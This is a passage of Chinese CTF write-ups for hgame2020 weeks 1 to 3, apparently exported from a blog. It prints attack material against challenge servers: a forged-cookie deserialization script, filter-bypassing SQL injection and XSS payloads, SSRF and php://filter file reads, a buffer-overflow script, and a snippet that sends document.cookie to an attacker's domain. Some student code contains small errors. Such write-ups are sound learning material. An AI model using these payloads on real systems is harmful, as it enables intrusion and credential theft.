\n\n*心态爆炸，玩天使一直送人头(题文无关)*  \n\n= =这题还是没搞懂\n","tags":["vidar"]},{"title":"hgame2020week3_wp","url":"/2020/02/14/hgame2020week3-wp/","content":"这周qwq基本等于没有在写题...\n\n# web\n## 序列之争\n啊...原来是要得到  \n```php\nprivate $encryptKey = 'SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW';\n```\n这里的encryptKey QAQ  \n```php\nclass Game\n{   \n    private $encryptKey = 'SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW';\n    public $welcomeMsg = '%s, Welcome to Ordinal Scale!';\n\n    private $sign = '';\n    public $rank;\n\n    public function __construct($playerName){\n        $_SESSION['player'] = $playerName;\n        if(!isset($_SESSION['exp'])){\n            $_SESSION['exp'] = 0;\n        }\n        $data = [$playerName, $this->encryptKey];\n        $this->init($data);\n        $this->monster = new Monster($this->sign);\n        $this->rank = new Rank();\n    }\n\n    private function init($data){\n        foreach($data as $key => $value){\n            $this->welcomeMsg = sprintf($this->welcomeMsg, $value);\n            $this->sign .= md5($this->sign . $value);\n        }\n    }\n}\n```\n看了hint,传入player=%s以此来得到$encryptKey  \n```php\nclass Rank\n{\n    private $rank;\n    private $serverKey;     // 服务器的 Key\n    private $key = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';\n\n    public function __construct(){\n        if(!isset($_SESSION['rank'])){\n            $this->Set(rand(2, 1000));\n            return;\n        }\n\n        $this->Set($_SESSION['rank']);\n    }\n\n    public function Set($no){\n        $this->rank = $no;\n    }\n\n    public function Get(){\n        return $this->rank;\n    }\n\n    public function Fight($monster){\n        if($monster['no'] >= $this->rank){\n            $this->rank -= rand(5, 15);\n            if($this->rank <= 2){\n                $this->rank = 2;\n            }\n\n            $_SESSION['exp'] += rand(20, 200);\n            return array(\n                'result' => true, \n                'msg' => '<span style=\"color:green;\">Congratulations! You win! </span>'\n            );\n        }else{\n            return array(\n                'result' => false, \n                'msg' => '<span style=\"color:red;\">You die!</span>'\n            );\n        }\n    }\n\n    public function __destruct(){\n        // 确保程序是跑在服务器上的！\n        $this->serverKey = $_SERVER['key'];\n        if($this->key === $this->serverKey){\n            $_SESSION['rank'] = $this->rank;\n        }else{\n            // 非正常访问\n            session_start();\n            session_destroy();\n            setcookie('monster', '');\n            header('Location: index.php');\n            exit;\n        }\n    }\n}\n\nclass Monster\n{\n    private $monsterData;\n    private $encryptKey;\n\n    public function __construct($key){\n        $this->encryptKey = $key;\n        if(!isset($_COOKIE['monster'])){\n            $this->Set();\n            return;\n        }\n\n        $monsterData = base64_decode($_COOKIE['monster']);\n        if(strlen($monsterData) > 32){//32是指md5的位数\n            $sign = substr($monsterData, -32);\n            $monsterData = substr($monsterData, 0, strlen($monsterData) - 32);\n            if(md5($monsterData . $this->encryptKey) === $sign){\n                $this->monsterData = unserialize($monsterData);\n            }else{\n                session_start();\n                session_destroy();\n                setcookie('monster', '');\n                header('Location: index.php');\n                exit;\n            }\n        }\n        \n        $this->Set();     \n    }\n\n    public function Set(){\n        $monsterName = ['无名小怪', 'BOSS: The Kernal Cosmos', '小怪: Big Eggplant', 'BOSS: The Mole King', 'BOSS: Zero Zone Witch'];\n        $this->monsterData = array(\n            'name' => $monsterName[array_rand($monsterName, 1)],\n            'no' => rand(1, 2000),\n        );\n        $this->Save();\n    }\n\n    public function Get(){\n        return $this->monsterData;\n    }\n\n    private function Save(){\n        $sign = md5(serialize($this->monsterData) . $this->encryptKey);\n        setcookie('monster', base64_encode(serialize($this->monsterData) . $sign));\n    }\n}\n```\n```php\n  <main role=\"main\" class=\"inner cover\">\n    <h2 class=\"cover-heading\"><?php echo($game->welcomeMsg);?></h2>\n    <h1># <?php echo($game->rank->Get());?></h1>\n    <?php if($game->rank->Get() === 1){?>\n        <h2>hgame{flag_is_here}</h2>\n    <?php }?>\n    <br>\n    ```\n在Monster类里有反序列化函数unserialize(),而里面传入的内容是我们可以控制的cookie,所以可以通过这个函数来使得this->rank()==1。关于进入unserialize()之前所要达到的条件，其实执行一遍Monster类里Save()函数的内容就可以了:\n```php\n<?php\nerror_reporting(0);\nsession_start();\n\nclass Game\n{   \n    private $encryptKey = 'gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL';\n\n    private $sign = '';\n    public $rank;\n\n    public function __construct(){\n        $data = [1, $this->encryptKey];\n        $this->init($data);\n    }\n\n    private function init($data){\n        foreach($data as $key => $value){\n            $this->sign .= md5($this->sign . $value);\n            \n        }\n        print($this->sign);\n    }\n}\n\nclass Rank\n{\n\n    private $rank;\n    public function __construct(){\n        $this->rank = $no;\n        if(!isset($_SESSION['rank'])){\n            $_SESSION['rank'] = 1;\n        }\n\n        $this->Set($_SESSION['rank']);\n    }\n\n    public function Set($no){\n        \n    }\n\n}\nnew Game();\n$res1=serialize(new Rank());\n//print($res1);\n$key='c4ca4238a0b923820dcc509a6f75849b4eb38c8d89d42dd45200003c8b7101c6';\n$sign = md5($res1 . $key);\nsetcookie('monster', base64_encode($res1 . $sign));\necho \"<br>\";\nprint($_COOKIE['monster']);\n?>\n```\n之后burpsuite拦截改cookie的值就可以了\n\n# misc\n## 三重隐写\n根据You konw LSB.wav先用silentEye把wav解码，出现key,用来解看起来很古风的mp3，得到flag.crypto，另一个mp3的图像是个条形码，在线解码一下。根据提供的工具，把条形码解码出的内容作为.crypto的key就可以得到flag\n\n# 赛后\n## web\n### 二发入魂\n官方wp给的资料(能读英文文章真是一项很重要的技能...)\n[BREAKING PHP'S MT_RAND() WITH 2 VALUES AND NO BRUTEFORCE](https://www.ambionics.io/blog/php-mt-rand-prediction)\n[中文翻译版](https://nosec.org/home/detail/3876.html)\n[reverse_mt_rand.py](https://github.com/ambionics/mt_rand-reverse/blob/master/reverse_mt_rand.py)\n脚本流程是，先访问https://twoshot.hgame.n3ko.co/random.php?times=228\n也就是抽卡228次\n之后利用上面的脚本，有如下\n```\npy -3 ./reverse_mt_rand.py randnum[0] randnum[227] 0 0\n```\n所产生的值就是seed，也就是cdkey\n利用os.popen()方法向https://twoshot.hgame.n3ko.co/verify.php\npost以上payload就可以得到返回结果\n\n### Cosmos的二手市场\n![](00.png)\n进行交易时容易形成条件竞争  \n那么我们先购入一件商品，在出售的时候形成条件竞争，在库存还未来得及变化的情况下将统一商品反复出售，之后写个脚本(不知道为啥用burpsuite钱还是没变化- -)\n[python：threading.Thread类的使用详解](https://blog.csdn.net/drdairen/article/details/60962439)\n脚本的构成是，对于buy和solve这两个行为定义两个函数，传入cookie值以及data(data中包含了commodity信息-code&amount)，后面利用threading.Thread类进行多线程(- -)  \n  \n  之后不打算写了- -很多题也有很详细的wp了，本质上我也是看wp复现的(是的就是这么菜)\n\n### Cosmos的留言板-2\n\n[sql盲注之时间盲注](https://www.lsablog.com/networksec/penetration/time-based-blind-sqli/)\n\n### Cosmos的聊天室2.0\nscript被过滤为空，双写绕过。输入后控制台发现异常\n```\nRefused to execute inline script because it violates the following Content Security Policy directive: \"script-src 'self'\". Either the 'unsafe-inline' keyword, a hash ('sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='), or a nonce ('nonce-...') is required to enable inline execution.\n```\nkey word:CSP\n[CTF|有关CSP绕过的方法](https://zhuanlan.zhihu.com/p/94246164)","tags":["vidar"]},{"title":"hgame2020week2_wp","url":"/2020/02/14/hgame2020week2-wp/","content":"凉了啊凉了啊  \n# Reverse\n## babyPy\n下载文件是个字节码，手动翻译一下，大概是这个样子  \n[参考网址](https://anhkgg.com/python-bytecode/)  \n```Python\ntmp1=flag[::-1]\ntmp2=list(tmp1)\nfor i in range(1,len(tmp2)):\n\ttmp3=tmp2[i-1]^tmp2[i]       \n\ttmp2[i]=tmp3\n\nres=bytes(tmp2).hex\nprint(res)\n```\n根据异或公式，可得m[i]= cipher[i] ^ cipher[i-1]  \n于是有如下  \n```Python\ncipher=bytes().fromhex('7d037d045717722d62114e6a5b044f2c184c3f44214c2d4a22')\n_cipher=list(cipher)\nm=b'}                                        '\n_m=list(m)\nfor i in range(1,len(_cipher)):\n\ttmp=_cipher[i]^_cipher[i-1]\n\t_m[i]=tmp\nflag=bytes(_m[::-1])\nprint(flag)\n```\n# Crypto\n## Verfication_code\n由源码得sha256(xxxx+已知字符串)=已知密文，爆破求xxxx，输入后再输入I like playing Hgame\n```Python\n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nimport socketserver\nimport os, sys, signal\nimport string, random\nfrom hashlib import sha256\nimport itertools\n\nmyStr='L0ZzlogdBWx1hlXC'\ndstDigest='236abe814ce3691e1d5959bd36b79ca31e3d31b6daf941fa60d2fb7f9a01b61d'\n\nfor i in itertools.permutations(string.ascii_letters+string.digits,4):\n\tproof=''.join(i)+myStr\n\tdigest=sha256(proof.encode()).hexdigest()\n\tif(digest==dstDigest):\n\t\tprint(i)\n```\n# Misc\n## Cosmos的午餐\n(感谢出题人的耐心解答)  \n一开始以为在流量包里找png或者jpeg之类的，但是相关的提取出来感觉不太对劲...（根据题目图片应该是二次元妹子...)  \n先把log导入解密，在http中找，发现一个比较不一样的包  \n![](wp2_img/01.png)\n点进去看看发现含有zip文件格式，导出来看下里边有张图片，提示用outguess，并且备注里给了key，然后解密下就好，解完了是个网址，下载下来一个压缩包，里边的图片二维码扫一下就行\n## 所见即为假\n发现7z可以直接解压，注释中的F5 key提示了F5隐写，于是利用F5-steganography\n```\njava Extract ./11.jpg -e res -p NllD7CQon6dBsFLr\n```\n得到hex文本，复制进winhex可得flag\n## 地球上最后的夜晚\n解压得no password.pdf，想到pdf隐写，用wbStego4.3open解码得到一个txt文件，里边写着zip的解压密码，解压得一个doc文件，试试转成xml，用7z对doc解压后进入word文件夹，发现secret.xml，打开就是flag\n## 玩玩条码\n下载得一个zip，里边注释:Decode JPNPostCode to get MSUStegoVideo password  \n俩文件对应注释里边内容，先看postcode，这是个日本的邮政编码，我是在生成条码网站上手动对比，一个个试的，不过也不复杂，有规律    \n[日本邮政条形码生成器](https://cn.online-qrcode-generator.com/japanpost-barcode-generator)  \n![](wp2_img/00.png)\n第二个，根据提示下了virtualdub2，再安MSU StegoVideo 插件，这个只能运行32位的，打开后根据网上教程，输入上一步骤所得的码进行解码，[使用 MSU StegoVideo](https://blog.csdn.net/wy_bk/article/details/85217583)  \n打开txt文件可得zip密码，7z解压后得条形码，在线扫一下就好\n[Free Online Barcode Reader](https://online-barcode-reader.inliteresearch.com/)  \n# 赛后复现\n## web\n### Cosmos的博客后台\n看到http://cosmos-admin.hgame.day-day.work/?action=login.php\n这样的字样，想到可能是php伪协议  \n[文件包含漏洞与php伪协议](https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/)  \n于是输入http://cosmos-admin.hgame.day-day.work/?action=php://filter/read=convert.base64-encode/resource=login.php\n解码后得到源码\n```php\n<?php\ninclude \"config.php\";\nsession_start();\n\n//Only for debug\nif (DEBUG_MODE){\n    if(isset($_GET['debug'])) {\n        $debug = $_GET['debug'];\n        if (!preg_match(\"/^[a-zA-Z_\\x7f-\\xff][a-zA-Z0-9_\\x7f-\\xff]*$/\", $debug)) {\n            die(\"args error!\");\n        }\n        eval(\"var_dump($$debug);\");\n    }\n}\n\nif(isset($_SESSION['username'])) {\n    header(\"Location: admin.php\");\n    exit();\n}\nelse {\n    if (isset($_POST['username']) && isset($_POST['password'])) {\n        if ($admin_password == md5($_POST['password']) && $_POST['username'] === $admin_username){\n            $_SESSION['username'] = $_POST['username'];\n            header(\"Location: admin.php\");\n            exit();\n        }\n        else {\n            echo \"用户名或密码错误\";\n        }\n    }\n}\n?>\n```\n可以注意到\n```\neval(\"var_dump($$debug);\");\n```\neval()与$$debug都是需要注意的点  对于$$debug来说,在这里我们的$$debug就是可变变量,在这里$$debug就表示$($debug的值),同时$GLOBALS — 引用全局作用域中可用的全部变量,想着$GLOBALS能打印出我们所需要的username与password,于是传入\n```\nhttp://cosmos-admin.hgame.day-day.work/?action=login.php&debug=GLOBALS\n```\n出现\n![](wp2_img/02.png)\n从\n```\n$admin_password == md5($_POST['password']) \n```\n可以知道这是一个弱比较，所以我们只要传入md5开头是0e的字符串,0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0  \n成功登入之后再看下admin.php的源码\n```php\n<?php\ninclude \"config.php\";\nsession_start();\nif(!isset($_SESSION['username'])) {\n    header('Location: index.php');\n    exit();\n}\n\nfunction insert_img() {\n    if (isset($_POST['img_url'])) {\n        $img_url = @$_POST['img_url'];\n        $url_array = parse_url($img_url);\n        if (@$url_array['host'] !== \"localhost\" && $url_array['host'] !== \"timgsa.baidu.com\") {\n            return false;\n        }   \n        $c = curl_init();\n        curl_setopt($c, CURLOPT_URL, $img_url);\n        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);\n        $res = curl_exec($c);\n        curl_close($c);\n        $avatar = base64_encode($res);\n\n        if(filter_var($img_url, FILTER_VALIDATE_URL)) {\n            return $avatar;\n        }\n    }\n    else {\n        return base64_encode(file_get_contents(\"static/logo.png\"));\n    }\n}\n?>\n```\n意思是要传入一个url且必须从localhost或者timgsa.baidu.com开始  \ncurl有http和file两种协议，当\n```url=file://www.baidu.com/etc/passwd```\n时,会直接读取/etc/password的内容，题目说明了flag在根目录下，所以在图片url处插入\n```file://localhost/flag```，然后用burpsuite借包查看返回的base64值\n\n### Cosmos的留言板-1\n先测试一下，发现过滤了select和空格\n[sql注入_过滤空格和注释符](https://www.cnblogs.com/peterpan0707007/p/7501507.html)\nselect可以通过大小写绕过，空格可以用/\\*\\*/代替,爆表```'/**/union/**/select/**/concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/having'1'='1```\n得到:f1aggggggggggggg  \n爆段名\n```'/**/union/**/seLect/**/concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='f1aggggggggggggg'/**/having/**/'1'='1```\n得到:fl4444444g\n爆值\n```'/**/union/**/seLect/**/fl4444444g/**/from/**/f1aggggggggggggg/**/having/**/'1'='1```\n### Cosmos的新语言\n\n```\n<?php\nhighlight_file(__FILE__);\n$code = file_get_contents('mycode');\neval($code);\n\n\nJzgCoycIGwIBr0qhJ1IQn05IoQWnoxb1GyuFryOLJ2cBEIV2G2gXZ05LFw4=\n```\nqwq居然访问/mycode就可以得到源码\n```php\nfunction encrypt($str){\n    $result = '';\n    for($i = 0; $i &lt; strlen($str); $i++){\n        $result .= chr(ord($str[$i]) + 1);\n    }\n    return $result;\n}\n\necho(encrypt(strrev(str_rot13(encrypt(base64_encode(strrev(strrev(str_rot13(base64_encode(base64_encode($_SERVER['token'])))))))))));\n\nif(@$_POST['token'] === $_SERVER['token']){\n    echo($_SERVER['flag']);\n}\n```\n意思就是发送的token要和解密后的server的token一致,但是发现每刷新一次，加密的方法与顺序都会变，所以要写脚本来实现解密，思路是得到源码中对token加密的这一行，再通过字符串比较判断所使用的函数  \n[python3网络爬虫开发实战](https://python3webspider.cuiqingcai.com/)\n(什么都不会的感觉太惨了= =)  \n顺手贴一个小语的wp来学习qwq  \n[Hgame-week2-writeup](http://www.xi4oyu.top/1966f4b8/#more)\n写脚本(照抄小语的)- -大概就是给自己加深下印象的...\n不知道为啥= =试了好几次都不行，出现各种错误，后来突然又行了...\n```python\n#py3\nfrom lxml import etree\nfrom requests import Session\nimport re\nimport base64\n\nse=Session()\n\n#get the encode\nurl='http://c339168464.php.hgame.n3ko.co/'\nr = se.get(url)\nhtml = etree.HTML(r.text)\nenc_code=html.xpath('//html/body/text()')[0]\n\n#get the method\n_url='http://c339168464.php.hgame.n3ko.co/mycode'\n_r=se.get(_url)\n_html = etree.HTML(_r.text)\np = r'echo\\((.*)\\(\\$_SERVER'#转义字符r,通过正则选取范围\nmethod=re.search(p,_r.text).group(1).split('(')\n\ndef rot13(s):\n    result = \"\"\n    for v in s:\n        c = ord(v)\n        if c >= ord('a') and c <= ord('z'):\n            if c > ord('m'):\n                c -= 13\n            else:\n                c += 13\n        elif c >= ord('A') and c <= ord('Z'):\n            if c > ord('M'):\n                c -= 13\n            else:\n                c += 13\n        result += chr(c)\n    return result\n\ndef decrypt(s):\n    res=''\n    for ch in s:\n        res+=chr(ord(ch)-1)\n    return res\n\nfor m in method:\n    if m == 'base64_encode':\n        enc_code=base64.b64decode(enc_code)\n    elif m =='encrypt':\n        enc_code=decrypt(enc_code)\n    elif m =='str_rot13':\n        enc_code=rot13(enc_code)\n    elif m == 'strrev':\n        enc_code=enc_code[::-1]\n\n#get the response\nr_=se.post('http://c339168464.php.hgame.n3ko.co/',data={'token': enc_code})\nflag=r_.text\nprint(flag)\n```\n### Cosmos的聊天室\n点击Flag is here的button后，出现提示\n![](wp2_img/03.png)\n那么应该是通过xss获取管理员cookie\n[ctf_web_cookie窃取](https://ctf-wiki.github.io/ctf-wiki/web/xss-zh/#cookies)\n当我们输入标签<\\img\\>时，查看源代码发现标签被过滤，通过\n```\n<!--\n```\n注释掉后面的<span>,而浏览器的容错性允许我们最后不用加>来闭合标签\n[Xss小游戏通关秘籍](https://zhuanlan.zhihu.com/p/75619278)\n[xss练习记录](https://www.kingkk.com/2018/08/xss%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/)\n于是我们发送\n```\n<img src=x onerror=\"alert(1)\"<!--\n```\n源代码中显示![](wp2_img/04.png)\n发现这个alert变大写了，采用html实体编码绕过(对alert进行unicode编码)\n```\n<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#49;&#34;&#41;\"<!--\n```\n发现可以成功执行。\n对于md5(code)[:6] == 11036f来说，要求md5值的前六位要做到相等。\n[Hgame-2020——WEB](http://www.pdsdt.lovepdsdt.com/index.php/2020/02/04/hgame-2020-web/#Cosmos-3)\n对验证码有\n```python\n#py3\nimport hashlib\n\nfor i in range(1, 100000000):\n    #s = hashlib.md5(str(i)).hexdigest()[0:8]\n    #s = hashlib.md5(str(i)).hexdigest()[:6]\n    s = hashlib.md5(str(i).encode(\"utf-8\")).hexdigest()[0:6]\n    if s == \"db97b8\":\n        print(i)\n        break\n```\n[hgame2020week2_offical](https://github.com/vidar-team/Hgame2020_writeup/tree/master/week2)\n之后就直接看官方wp了- -还有小语的wp(靠小语wp过日子)\n其实验证码应该是7-8位(- -以我有限的样本来说)  \n[xiaoyu的wp](http://www.xi4oyu.top/1966f4b8/)  \n关于\n```\n(function(){\n    var img = new Image();\n    img.src='http://我的域名/?token='+document.cookie;\n})();\n```\n有\n[Document.cookie](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie)","tags":["vidar"]},{"title":"hgame2020week1_wp","url":"/2020/01/25/hgame2020week1-wp/","content":"  \n感谢出题人的耐心解答...  \n= =可惜大二了才刚刚开始....  \npy出题人虽然可耻但有用(X\n\n## web  \n### Cosmos的博客  \n![](01.png)\n.git源码泄露   \npayload：http://cosmos.hgame.n3ko.co/.git/config  \n![](03.png)\n把github上的仓库git clone下来再进行回滚  \ngit clone https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc  \ncd 8LTUKCL83VLhXbc  \ngit log  \n![](04.png)\ncommit 后面就是对应的版本id  \n![](05.png)\nBase64解码之后就可以得到flag\n\n### 接头霸王  \n看见题目就想到请求头，用postman一步步进行修改\n![](06.png)\n根据提示在请求头中一步步添加  \nreferer:https://vidar.club/  \nX-Forwarded-For:127.0.0.1(You need to visit locally)  \nUser-Agent：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Cosmos/78.0.3904.108 Safari/537.36(use Cosmos Brower)\n之后提示\n![](11.png)\n看一下响应头\n![](12.png)\n![](08.png)\n因为请求方式是POST，所以 if-Unmodified-Since:Tue,15 Nov 2099 00:00:00 GMT  \n\n### Code World  \nf12看源码\n![](14.png)\n发现提示，用burpsuite抓包\n![](15.png)  \n![](45.png)\n405是指method not allowed，所以把get改成post\n![](17.png)\n因为+会被当作空格处理，所以用url的%2b\n![](18.png)\n\n### 鸡尼泰玫  \n发现是个小游戏，先玩一下，输掉之后发现有提示：积分达到30000才能拿到flag  \nF12看一下源码\n![](13.png)\n在console中直接输入storageScore=30000;globalScore=30000，覆盖原值  \n再开始玩游戏，直接输掉之后积分超过30000了，就可以看到flag\n\n## Misc  \n### 欢迎参加HGame！  \n看这个字符串以为是什么特殊的编码，google搜不到就百度一下  \n用base64解码，解出来是morse码，再在线解一下就可以得到flag  \n### 壁纸  \nwinhex打开后发现含有flag.txt文件并且尾部有提示：passsword is picture ID  \n后来才知道这个id指的是p站上的图片id…  \n图片里有个压缩包(PK开头)  \nforemost 图片名.jpg  \n分离得到一个加密压缩包，输入图片id  \ntxt里是unicode码，在线解码下得到flag   \n### 克苏鲁神话  \n打开bacon.txt，看名字是培根加密  \n![](22.png)\n根据这个解密，得到flaghiddenindoc这个提示，但是这个不是密码  \n后来搜索到明文攻击，用zip不行所以用7z  \n解压后得到一个doc文件，选择隐藏文字功能flag就可以显示了    \n### 签到题ProPlus  \n根据提示进行栅栏解密，凯撒解密，密码为大写\n![](23.png)\n解压之后得到OK.txt，在线okk解码，发现base32的提示，base32解码后再base64，再转换为文本，发现开头是png，于是转成16进制，复制进winhex保存为png可得二维码，扫一下就有flag了  \n### 每日推荐  \n（感谢出题人的耐心解答qwq）  \n（一开始直接用foremost分离文件，再winrar修复文件是不行的…）  \n通过foremost可以看到里边有zip文件  \n在wireshark里打开后，搜索zip，找到了对应的包  \n![](26.png)\n导出后发现有提示密码为六位数字，用AAPR爆破得到密码  \n解压后得到一个mp3文件，用audacity打开，目测一下波形没什么奇怪的地方（还挺好听\n再看看频谱图得到flag  \n## Crypto  \n### infantRSA  \n给出数据如下  \np = 681782737450022065655472455411;  \nq = 675274897132088253519831953441;  \ne = 13;  \nc=pow(m,e,p * q)=275698465082361070145173688411496311542172902608559859019841  \n![](24.png)\n所以已知pqec的话先求出d，再求m就好  \n```python\nimport gmpy2\n\np=681782737450022065655472455411\nq=675274897132088253519831953441\ne=13\nc=275698465082361070145173688411496311542172902608559859019841\ns=(p-1)*(q-1)\nd=long(gmmpy2.invert(e,s))\nn=p*q\nm=pow(c,d,n)\nres=m.to_bytes(m.bit_length(),byteorder='big')\nprint(res)\n```\n### Affine\n这题直接改了网上的脚本  \na.b.flag都是未知的，但是我们知道密文和明文中的hgame，于是先求a和b\n```python\nimport gmpy2\nfrom Crypto.Util.number inverse\n\nTABLE = 'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'\nMOD = len(TABLE)\n\npre=[12,11,7,6,18]\npost=[46,33,43,30,0]\nfor a in range(MOD):\n\tif GCD(a,MOD)!=1:\n\t\tcontinue\n\tinv_a=inverse(a,MOD)\n\tfor b in range(MOD):\n\t\tq=1\n\t\tfor i in range(5):\n\t\t\tif(inv_a*(post[i]-b))%MOD!=pre[i]:\n\t\t\t\tq=0\n\t\t\t\tbreak\n\t\tif(q):\n\t\t\tprint(a,b)\n\t\t\t#13,14\n```\nab求出后可以求得完整的明文\n```python\nimport gmpy2\nfrom Crypto.Util.number inverse\n\nTABLE = 'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'\nMOD = len(TABLE)\na=13\nb=14\ninv_a=inverse(a,MOD)\ncipher='A8I5z{xr1A_J7ha_vG_TpH410}'\nflag=''\nfor p in cipher:\n\ti=TABLE.find(p)\n\tif i==-1:\n\t\tflag+=p\n\telse:\n\t\tii=(inv_a*(i-b))%MOD\n\t\tflag+=TABLE[ii]\nprint(flag)\n```\n### Reorder\n这题一开始是真的懵比…..后来问了一下lurk  \n发现输入某个字符后，返回后的字符所在位置就是所对应的密文  \n![](00.png)\n输入  \n0  \n00  \n000  \n0000  \n00000  \n发现返回的位置和hgame相对应，之后一直添加输入数量，再观察每次新增的位置所对应的字符就好啦~  \n## PWN\n### Hard_AAAAA\n感谢C老板的耐心解答，顺便把坑都踩了一遍….  \n下载之后先例常checksec（感觉保护开没开其实影响不是很大…..也可能是因为我不懂） \nIda启动！f5！  \n![](31.png)\n![](32.png)\n可以通过gets()使得s溢出覆盖v5的值，从而满足if内的条件，执行backdoor()函数  \ns与v5的相对距离为0xAC-0x31,这一段用随便什么数据填充:’a’ * (0xAC-0x31)  \n之后要满足memcmp的条件即memcmp(“0O0o”,&v5,7u)==0  \n在7个内存单元内，v5能和“0O0o”相等（….没注意到7…）  \n双击memcmp中的“0O0o”，跳转  \n![](33.png)\n发现和”O0”相邻，就是说比较完“0O0o”后会继续比较“O0”  \n所以构造payload=’a’ * (0xAC-0x31)+’ 0O0o\\00O0’(之前还打成了’0O0o\\\\\\00O0’,我是真的蠢)  \n```python\nfrom pwn import *\np=remote(\"47.103.214.163\",\"20000\")\np.recvuntil(\"Let's 0O0o\\\\0O0!\")\npayload='a'*(0xAC-0x31)+'0O0o\\00O0'\np.sendline(payload)\np.interactive()\n```\n连上后输入ls查看目录，发现有个flag，再cat flag读取内容就好了  \n## Reverse\n### maze\nIda启动！f5！  \n![](39.png)\n猜测是方向键，选中数字按R后就会变成dswa(常用方向键)  \n![](40.png)\n![](41.png)\n代码给出了迷宫范围(上下限)以及v5要走的路线(0上)  \n先看看v5的行走范围，即迷宫地图，点进unk_602080 \n\n![](42.png)  \n\n长这样，选中unk_602080和unk_    60247C间的内容按a可以简单合并一下，标记好出口和入口位置  \n通过代码分析，上下移动对应64个step，左右对应4个，所以删除掉多余的数据（我是手动删….）  \n![](44.png)\n其中上边的(0是入口，最后的(0是出口，可以很明显看到走出迷宫的路径  \n行走的方向键加上hgame{}就是flag\n","tags":["vidar"]}]